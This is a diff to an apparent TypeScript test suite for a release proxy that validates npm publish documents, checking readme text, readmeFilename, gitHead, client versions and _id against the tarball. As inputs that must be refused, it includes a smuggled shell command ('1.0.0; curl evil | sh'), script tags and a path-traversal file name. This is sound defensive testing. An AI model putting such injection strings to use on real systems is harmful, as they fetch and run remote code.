@@ -15,7 +15,7 @@ import { AttestationStore } from "../src/release/attest";
 import { compatRules, RELEASE_GITHUB_SECRET } from "../src/release/compat";
 import { ReleaseLane, type ReleaseSigner } from "../src/release/lane";
 import { parseTarget } from "../src/release/publish/config";
-import { integrityOf } from "../src/release/publish/npm";
+import { inspectNpmTarball, integrityOf } from "../src/release/publish/npm";
 import type { PublishTarget } from "../src/release/publish/types";
 import {
   channelMac,
@@ -35,10 +35,17 @@ const sha256 = (b: Uint8Array | string): string => createHash("sha256").update(b
 const tmp = mkdtempSync(join(tmpdir(), "ls-compat-"));
 afterAll(() => rmSync(tmp, { recursive: true, force: true }));
 
-async function tarball(pkg: Record<string, unknown>): Promise<Uint8Array> {
+async function tarball(
+  pkg: Record<string, unknown>,
+  files: Record<string, string> = {},
+): Promise<Uint8Array> {
   const d = mkdtempSync(join(tmp, "pkg-"));
   mkdirSync(join(d, "package"));
   writeFileSync(join(d, "package", "package.json"), JSON.stringify(pkg));
+  for (const [name, text] of Object.entries(files)) {
+    mkdirSync(dirname(join(d, "package", name)), { recursive: true });
+    writeFileSync(join(d, "package", name), text);
+  }
   return tarDirectory(d, ["package"]);
 }
 
@@ -197,6 +204,8 @@ describe("the npm document a job may send", () => {
       ...rel,
       digests: { ...rel.digests, "web-1.0.0.tgz": sha256(tgz) },
       npmManifests: { "web-1.0.0.tgz": PKG },
+      npmReadmes: { "web-1.0.0.tgz": { "README.md": "# web\n", README: "plain readme\n" } },
+      sha: SHA,
       ...over,
     });
     return checkBody(rule!.bodyCheck!, Buffer.from(doc));
@@ -211,10 +220,12 @@ describe("the npm document a job may send", () => {
     expect(check(publishDoc(tgz))).toEqual({ ok: true });
     // the fields the client adds on its own are tolerated
     const d = JSON.parse(publishDoc(tgz)) as Record<string, any>;
-    d.readme = "# hi";
+    d.readme = "# web\n";
+    d.versions["1.0.0"].readme = "# web\n";
+    d.versions["1.0.0"].readmeFilename = "README.md";
     d.versions["1.0.0"]._nodeVersion = "22.0.0";
-    d.versions["1.0.0"]._npmVersion = "10.0.0";
-    d.versions["1.0.0"].gitHead = "a".repeat(40);
+    d.versions["1.0.0"]._npmVersion = "10.0.0-rc.1";
+    d.versions["1.0.0"].gitHead = SHA;
     d.versions["1.0.0"].dist.tarball = "https://registry.npmjs.org/x.tgz";
     expect(check(JSON.stringify(d))).toEqual({ ok: true });
   });
@@ -279,6 +290,133 @@ describe("the npm document a job may send", () => {
     const len = JSON.parse(publishDoc(tgz)) as Record<string, any>;
     len._attachments["@acme/web-1.0.0.tgz"].length = 3;
     refused(check(JSON.stringify(len)), "attachment_length");
+  });
+
+  const doc = (edit: (d: Record<string, any>) => void): string => {
+    const d = JSON.parse(publishDoc(tgz)) as Record<string, any>;
+    edit(d);
+    return JSON.stringify(d);
+  };
+
+  test("a readme is empty or exactly a README file of the tarball, never other text", () => {
+    refused(
+      check(doc((d) => (d.readme = "# buy my coin, visit evil.example"))),
+      "readme_not_from_tarball",
+    );
+    refused(
+      check(doc((d) => (d.versions["1.0.0"].readme = "<script>x</script>"))),
+      "readme_not_from_tarball",
+    );
+    refused(check(doc((d) => (d.readme = 5))), "readme_not_from_tarball");
+    // a prefix or a lightly edited copy is not the file
+    refused(check(doc((d) => (d.readme = "# web"))), "readme_not_from_tarball");
+    expect(check(doc((d) => (d.readme = "")))).toEqual({ ok: true });
+    expect(check(doc((d) => (d.versions["1.0.0"].readme = "")))).toEqual({ ok: true });
+    expect(check(doc((d) => (d.readme = "# web\n")))).toEqual({ ok: true });
+    // either README the tarball carries is acceptable (the client picks one)
+    expect(check(doc((d) => (d.versions["1.0.0"].readme = "plain readme\n")))).toEqual({
+      ok: true,
+    });
+    // a tarball with no README allows only an empty readme
+    const none = { npmReadmes: { "web-1.0.0.tgz": {} } };
+    refused(
+      check(
+        doc((d) => (d.readme = "# web\n")),
+        none,
+      ),
+      "readme_not_from_tarball",
+    );
+    expect(
+      check(
+        doc((d) => (d.readme = "")),
+        none,
+      ),
+    ).toEqual({ ok: true });
+  });
+
+  test("readmeFilename names a README of the tarball and matches the readme it goes with", () => {
+    refused(
+      check(doc((d) => (d.versions["1.0.0"].readmeFilename = "evil.md"))),
+      "readme_filename_mismatch",
+    );
+    refused(
+      check(doc((d) => (d.versions["1.0.0"].readmeFilename = "../README.md"))),
+      "readme_filename_mismatch",
+    );
+    refused(
+      check(
+        doc((d) => {
+          d.versions["1.0.0"].readmeFilename = "README";
+          d.versions["1.0.0"].readme = "# web\n";
+        }),
+      ),
+      "readme_filename_mismatch",
+    );
+    expect(
+      check(
+        doc((d) => {
+          d.versions["1.0.0"].readmeFilename = "README.md";
+          d.versions["1.0.0"].readme = "# web\n";
+        }),
+      ),
+    ).toEqual({ ok: true });
+    expect(check(doc((d) => (d.versions["1.0.0"].readmeFilename = "README")))).toEqual({
+      ok: true,
+    });
+  });
+
+  test("gitHead is absent or the approved tag's commit", () => {
+    refused(check(doc((d) => (d.versions["1.0.0"].gitHead = "c".repeat(40)))), "git_head_mismatch");
+    refused(check(doc((d) => (d.versions["1.0.0"].gitHead = ""))), "git_head_mismatch");
+    expect(check(doc((d) => (d.versions["1.0.0"].gitHead = SHA)))).toEqual({ ok: true });
+    // with no known commit, no gitHead is accepted at all
+    refused(
+      check(
+        doc((d) => (d.versions["1.0.0"].gitHead = SHA)),
+        { sha: undefined },
+      ),
+      "git_head_mismatch",
+    );
+  });
+
+  test("_nodeVersion and _npmVersion are semver-shaped and nothing else", () => {
+    for (const k of ["_nodeVersion", "_npmVersion"]) {
+      for (const bad of [
+        "latest",
+        "1.0",
+        "1.0.0; curl evil | sh",
+        "v22.0.0",
+        22,
+        "",
+        "1.0.0 <script>",
+      ]) {
+        refused(check(doc((d) => (d.versions["1.0.0"][k] = bad))), "client_version_malformed");
+      }
+      for (const good of ["22.1.0", "10.9.2", "11.0.0-beta.1", "1.2.3+build.5"]) {
+        expect(check(doc((d) => (d.versions["1.0.0"][k] = good)))).toEqual({ ok: true });
+      }
+    }
+  });
+
+  test("_id is exactly <name>@<version>", () => {
+    refused(check(doc((d) => (d.versions["1.0.0"]._id = "@acme/web@1.0.1"))), "manifest_mismatch");
+    refused(
+      check(doc((d) => (d.versions["1.0.0"]._id = "@acme/other@1.0.0"))),
+      "manifest_mismatch",
+    );
+    refused(check(doc((d) => (d._id = "@acme/other"))), "name_mismatch");
+    expect(check(doc((d) => (d.versions["1.0.0"]._id = "@acme/web@1.0.0")))).toEqual({ ok: true });
+  });
+
+  test("the lane reads the README files from the tarball itself, top level only", async () => {
+    const t = await tarball(PKG, {
+      "README.md": "# real\n",
+      readme: "lower\n",
+      "docs/README.md": "# nested\n",
+      "READMEFIRST.txt": "no\n",
+    });
+    const r = inspectNpmTarball(t, "@acme/web", "v1.0.0");
+    expect(r.ok && r.readmes).toEqual({ "README.md": "# real\n", readme: "lower\n" });
   });
 
   test("other bytes are still refused first", async () => {
@@ -456,6 +594,9 @@ describe("the release proxy", () => {
       publishDoc(npmTar, PKG, { "dist-tags": { latest: "1.0.0", next: "1.0.0" } }),
     );
     expect(tagged.status).toBe(403);
+    // text npmjs.com would show must come from the tarball
+    const injected = await viaProxy(publishDoc(npmTar, PKG, { readme: "visit evil.example" }));
+    expect(injected.status).toBe(403);
     expect(seen).toHaveLength(1);
     const log = await outcomes();
     expect(log).toContain("secret_use:ok");
